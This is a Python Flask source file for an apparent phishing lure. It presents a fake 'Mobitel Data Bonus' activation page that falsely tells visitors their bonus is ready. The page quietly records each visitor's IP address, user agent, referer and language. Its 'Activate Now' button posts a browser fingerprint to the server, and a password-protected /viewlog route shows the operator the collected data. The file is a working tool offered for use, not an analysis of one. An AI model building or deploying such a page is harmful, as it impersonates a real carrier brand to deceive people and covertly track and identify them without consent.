from flask import Flask, request, render_template_string, abort
import datetime
import json
import os

app = Flask(__name__)

LOG_FILE = "visitors.log"
# Set a secret password – change this to something only you know!
SECRET_PASSWORD = "MySecretViewKey123"

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Mobitel Data Bonus - Confirmation</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial; text-align: center; padding: 40px; background:#f5f5f5; }
        .card { background:white; border-radius:10px; padding:30px; max-width:400px; margin:50px auto; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
        .notice { font-size: 11px; color: #aaa; margin-top: 25px; }
        button { background:#0070f3; color:white; border:none; padding:12px 30px; border-radius:5px; font-size:16px; cursor:pointer; }
    </style>
</head>
<body>
    <div class="card">
        <h3>📱 Mobitel Data Bonus</h3>
        <p>Your data bonus package is ready for activation.</p>
        <button onclick="sendFingerprint()">Activate Now</button>
        <div id="status" style="margin-top:15px;"></div>
        <p class="notice">By proceeding, you agree to our terms. This site collects diagnostic data for security purposes.</p>
    </div>
    <script>
        async function sendFingerprint() {
            const fp = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                timestamp: new Date().toISOString()
            };
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(fp)
                });
                document.getElementById('status').innerHTML = '✅ Activation successful! Your bonus will be credited shortly.';
            } catch (e) {
                document.getElementById('status').innerText = 'Please try again.';
            }
        }
    </script>
</body>
</html>
"""

def get_real_ip():
    forwarded = request.headers.get('X-Forwarded-For')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def index():
    log_entry = {
        "ip": get_real_ip(),
        "user_agent_raw": request.headers.get('User-Agent'),
        "referer": request.headers.get('Referer'),
        "accept_language": request.headers.get('Accept-Language'),
        "timestamp": datetime.datetime.utcnow().isoformat(),
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log_entry) + "\n")
    return render_template_string(HTML_PAGE)

@app.route('/log', methods=['POST'])
def log_fingerprint():
    data = request.get_json()
    entry = {
        "ip": get_real_ip(),
        "fingerprint": data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    return "ok"

# NEW: secret log viewer
@app.route('/viewlog')
def view_log():
    password = request.args.get('key', '')
    if password != SECRET_PASSWORD:
        abort(403)  # Forbidden
    try:
        with open(LOG_FILE, "r") as f:
            contents = f.read()
    except FileNotFoundError:
        contents = "No visitors yet."
    # Return as plain text for easy copying
    return f"<pre>{contents}</pre>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)